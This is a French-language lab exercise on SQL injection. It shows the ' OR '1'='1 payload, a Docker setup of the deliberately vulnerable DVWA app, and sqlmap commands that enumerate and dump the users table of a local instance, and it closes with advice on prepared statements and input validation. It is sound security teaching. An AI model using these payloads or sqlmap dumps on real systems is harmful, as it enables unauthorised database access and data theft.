# TP d'injection SQL avec DVWA sur Docker, Kali Linux et sqlmap

## Introduction à l'Injection SQL

L'injection SQL est une vulnérabilité de sécurité web qui permet à un attaquant d'interférer avec les requêtes SQL qu'une application exécute sur sa base de données. En injectant du code SQL malveillant dans les entrées utilisateur, un attaquant peut contourner les mesures de sécurité, accéder à des données sensibles, modifier ou supprimer des données, voire même exécuter des commandes sur le serveur de base de données.

### Exemple d'Injection SQL

Prenons un exemple simple. Un site web a une page de connexion avec un champ "Nom d'utilisateur". Le code SQL pour vérifier les identifiants pourrait être :

```sql
SELECT * FROM utilisateurs WHERE nom_utilisateur = '$nom_utilisateur';
```

Si un utilisateur entre `' OR '1'='1`, la requête devient :

```sql
SELECT * FROM utilisateurs WHERE nom_utilisateur = '' OR '1'='1';
```

Comme `1=1` est toujours vrai, la requête renvoie toutes les lignes de la table utilisateurs, permettant potentiellement à l'attaquant de se connecter sans connaître le mot de passe.

## Mise en place de l'environnement sur Docker

### 1. Créer un réseau Docker

```bash
docker network create dvwa-network
```
![dvwa-network](Screenshot 2024-12-19 210102.png)

### 2. Lancer DVWA avec MySQL

Créez un fichier `docker-compose.yml` avec le contenu suivant :

```yaml
version: '3.8'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "80:80"
    networks:
      - dvwa-network
    depends_on:
      - mysql
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: "kali"
      MYSQL_DATABASE: dvwa
      MYSQL_USER: dvwa
      MYSQL_PASSWORD: "kali"
    volumes:
      - db_data:/var/lib/mysql
    networks:
      - dvwa-network

volumes:
  db_data:

networks:
  dvwa-network:
    driver: bridge
```

Exécutez :

```bash
docker-compose up -d
```
![Lancer les conteneurs docker](Screenshot 2024-12-19 210732.png)

### 3. Lancer Kali Linux (facultatif)

Si vous utilisez une instance Kali Linux existante, assurez-vous que `sqlmap` est installé :

```bash
sudo apt update && sudo apt install sqlmap
```

## TP avec sqlmap

### 1. Accéder à DVWA

Ouvrez votre navigateur et accédez à `http://localhost`. Configurez DVWA (database setup). Assurez-vous de choisir le niveau de sécurité "Low" pour cet exercice.
![Accès à DVWA](Screenshot 2024-12-19 211119.png)

![Alt text](Screenshot 2024-12-19 211137.png)

![Alt text](Screenshot 2024-12-19 211300.png)

![Alt text](Screenshot 2024-12-19 211733.png)

### 2. Identifier la vulnérabilité

Dans DVWA, allez dans "SQL Injection". Entrez un ID (par exemple, 1). Observez l'URL. Elle devrait ressembler à ceci : `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#`.

![Alt text](Screenshot 2024-12-19 211821.png)

![Alt text](Screenshot 2024-12-19 211836.png)

### 3. Utilisation de sqlmap

#### Tester la vulnérabilité

```bash
sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 --dbs --batch --level 1
```
![sqlmap Test Vulnerability](Screenshot 2024-12-19 212018.png)

#### Lister les tables d'une base de données

```bash
sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa --tables --batch --level 1
```
![sqlmap List Tables](Screenshot 2024-12-19 212121.png)

#### Lister les colonnes d'une table

```bash
sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa -T users --columns --batch --level 1
```
![sqlmap List Columns](Screenshot 2024-12-19 214207.png)
#### Récupérer les données d'une table

```bash
sqlmap -u http://localhost/vulnerabilities/sqli/?id=1 -D dvwa -T users --dump --batch --level 1
```
![sqlmap Dump Data](Screenshot 2024-12-19 214232.png)
## Résumé

Ce TP a permis de comprendre les bases de l'injection SQL, de mettre en place un environnement de test avec Docker, DVWA et Kali Linux, et d'utiliser `sqlmap` pour exploiter une vulnérabilité d'injection SQL.

## Conclusion

L'injection SQL est une menace sérieuse pour les applications web. Il est crucial de mettre en œuvre des mesures de sécurité robustes, telles que la validation et l'échappement des entrées utilisateur, l'utilisation de requêtes préparées ou d'ORM, pour prévenir ces attaques. Ce TP offre une expérience pratique pour comprendre et contrer cette vulnérabilité.
